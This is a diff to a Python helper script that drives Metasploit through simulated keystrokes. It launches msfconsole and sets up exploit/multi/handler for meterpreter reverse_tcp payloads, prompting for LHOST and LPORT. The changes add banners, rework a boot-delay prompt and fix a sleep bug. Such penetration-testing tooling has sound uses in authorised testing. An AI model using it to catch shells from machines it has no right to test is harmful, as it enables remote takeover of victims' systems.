@@ -4,6 +4,9 @@ from pynput.keyboard import Key, Controller
 keyboard = Controller()
 
 os.system("clear")
+print("-" * 80)
+print("!!!WARNING PLEASE DO NOT LEAVE THIS TERMINAL WHILE THE PROGRAM IS SETTING UP!!!")
+print("-" * 80)
 print("Please choose an option: ")
 print("1. Manually type payload name. ")
 print("2. Choose from a list.")
@@ -11,8 +14,10 @@ choiceOne = raw_input("")
 os.system("clear")
 
 if choiceOne == "1":
+	print("-" * 80)
 	payload = raw_input("What payload are you going to be using? ")
 elif choiceOne == "2":
+	print("-" * 80)
 	print("Please choose an option: ")
 	print("1. linux/x86/meterpreter/reverse_tcp")
 	print("2. windows/meterpreter/reverse_tcp")
@@ -48,31 +53,40 @@ else:
 	os.system("exit")
 
 os.system("clear")
-print("How fast is your PC? ")
-print("1. Very Fast.")
-print("2. Fast.")
-print("3. Decent.")
-print("4. Slow.")
+print("-" * 80)
+print("How long does your PC take to boot Metasploit? ")
+print("1. 10 seconds.")
+print("2. 15 seconds.")
+print("3. 20 seconds.")
+print("4. 25 seconds.")
+print("5. Custom time.")
 pcSpeed = raw_input("")
-if pcSpeed == 1:
-	sleeper = time.sleep(10)
-elif pcSpeed == 2:
-	sleep = time.sleep(15)
-elif pcSpeed == 3:
-	sleep = time.sleep(20)
-elif pcSpeed == 4:
-	sleep = time.sleep(25)
+if pcSpeed == "1":
+	sleeper = "10.0"
+elif pcSpeed == "2":
+	sleeper = "15.0"
+elif pcSpeed == "3":
+	sleeper = "20.0"
+elif pcSpeed == "4":
+	sleeper = "25.0"
+elif pcSpeed == "5":
+	os.system("clear")
+	print("-" * 80)
+	sleeper = raw_input("Please enter your custom time in seconds: ")
 else:
 	print("That is not a valid option!")
 	raw_input("Press any button to continue...\n")
 	os.system("exit")
-
+sleeperTwo = float(sleeper)
 
 os.system("clear")
+print("-" * 80)
 ip = raw_input("What is your LHOST? ")
 os.system("clear")
+print("-" * 80)
 port = raw_input("What is your LPORT? ")
 os.system("clear")
+print("-" * 80)
 exploit = raw_input("Do you want to run the exploit immediately? (Y/N) ")
 os.system("clear")
 exploitTwo = exploit.lower()
@@ -82,7 +96,7 @@ time.sleep(1)
 keyboard.type("msfconsole")
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
-sleeper
+time.sleep(sleeperTwo)
 keyboard.type("use exploit/multi/handler")
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
